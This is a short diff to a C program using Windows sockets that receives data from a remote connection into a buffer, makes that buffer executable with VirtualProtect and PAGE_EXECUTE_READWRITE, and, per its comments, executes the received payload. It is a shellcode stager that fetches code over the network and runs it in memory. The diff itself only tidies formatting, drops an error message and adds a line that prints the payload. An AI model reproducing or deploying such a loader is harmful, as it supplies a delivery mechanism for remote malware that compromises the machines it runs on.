@@ -41,23 +41,22 @@ int main() {
   printf("Receiving");
   do {
     res = recv( ConnectSocket, data, 1024, 0 );
-    if (res > 0) { 
-      printf("."); 
+    if (res > 0) {
+      printf(".");
     }
     else if (res == 0) {
-
       break;
     }
     else {
-      printf("Here's My Freaking ERROR! %ld", WSAGetLastError());
       break;
     }
   } while (res > 0);
   printf("Received payload with size of %d.\n", sizeof(data));
+  printf("%s", data);
 
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
-  VirtualProtect(data, sizeof(data),PAGE_EXECUTE_READWRITE,NULL);
+  VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
 
   printf("Executing payload.\n");
   // Execute the received payload
